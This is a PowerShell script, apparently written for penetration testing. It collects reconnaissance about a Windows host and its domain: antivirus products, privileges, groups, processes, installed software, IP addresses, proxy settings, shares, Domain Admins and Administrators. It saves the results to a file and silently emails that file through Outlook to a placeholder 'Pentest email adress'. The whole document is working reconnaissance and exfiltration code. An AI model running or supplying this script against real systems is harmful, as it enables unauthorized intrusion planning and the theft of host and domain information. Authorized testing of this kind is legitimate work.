#Information about Computersettings 
Get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" | Out-File -FilePath $env:USERPROFILE\HostInfos.txt 

#Information about installed AV
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath $env:USERPROFILE\HostInfos.txt -Append

#User Privileges
whoami /priv | Out-File -FilePath $env:USERPROFILE\HostInfos.txt -Append


#Installed Products
wmic product get name | Out-File -FilePath $env:USERPROFILE\HostInfos.txt -Append

#Check Processes 
ps | Out-File -FilePath $env:USERPROFILE\HostInfos.txt -Append

#Check Verzeichnisse
ls | Out-File -FilePath $env:USERPROFILE\HostInfos.txt -Append

#Check Path
pwd | Out-File -FilePath $env:USERPROFILE\HostInfos.txt -Append

#Check External IP
powershell Invoke-RestMethod -Uri ('https://ipinfo.io/') | Out-File -FilePath $env:USERPROFILE\HostInfos.txt -Append

#Check Internal IP 
ipconfig | Out-File -FilePath $env:USERPROFILE\HostInfos.txt -Append

#Check Internet Proxy
[System.Net.WebProxy]::GetDefaultProxy()| Out-File -FilePath $env:USERPROFILE\HostInfos.txt -Append

#Check Groups
whoami /groups | Out-File -FilePath $env:USERPROFILE\HostInfos.txt -Append

#Check net use
net use | Out-File -FilePath $env:USERPROFILE\HostInfos.txt -Append

dir | Out-File -FilePath $env:USERPROFILE\HostInfos.txt -Append
net statistics server | Out-File -FilePath $env:USERPROFILE\HostInfos.txt -Append
net group "Domain Admins" /DOMAIN | Out-File -FilePath $env:USERPROFILE\HostInfos.txt -Append
net localgroup "Administrators" /DOMAIN | Out-File -FilePath $env:USERPROFILE\HostInfos.txt -Append


#Delay
Start-Sleep -s 5

#create COM object named Outlook
$Outlook = New-Object -ComObject Outlook.Application
#create Outlook MailItem named Mail using CreateItem() method
$Mail = $Outlook.CreateItem(0)
#add properties as desired
$Mail.To = "Pentest email adress"
$Mail.Subject = "Pre-Information"
$Mail.Body = "Pre-Information"
$mail.Attachments.Add("$env:USERPROFILE\HostInfos.txt")
$Mail.Send()
